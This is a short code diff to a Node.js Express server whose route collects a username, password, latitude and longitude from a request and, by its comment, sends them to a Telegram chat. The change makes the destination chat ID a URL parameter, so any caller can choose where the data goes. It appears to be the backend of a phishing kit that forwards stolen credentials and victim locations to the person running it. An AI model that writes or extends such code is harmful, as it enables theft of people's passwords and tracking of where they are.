@@ -29,16 +29,16 @@ app.use(express.static(path.join(__dirname, "public")));
 
 // Load environment variables
 const botToken = process.env.BOT_TOKEN;
-const chatId = process.env.CHAT_ID;
 const port = process.env.PORT || 3000;
 
-if (!botToken || !chatId) {
-    console.error("❌ Missing BOT_TOKEN or CHAT_ID in environment variables");
+if (!botToken) {
+    console.error("❌ Missing BOT_TOKEN in environment variables");
     process.exit(1);
 }
 
-// API Route to send Telegram message
-app.post("/sendMessage", async (req, res) => {
+// API Route to send Telegram message with dynamic chatId
+app.post("/:chatId/sendMessage", async (req, res) => {
+    const { chatId } = req.params;
     const { username, password, latitude, longitude } = req.body;
 
     if (!username || !password) {
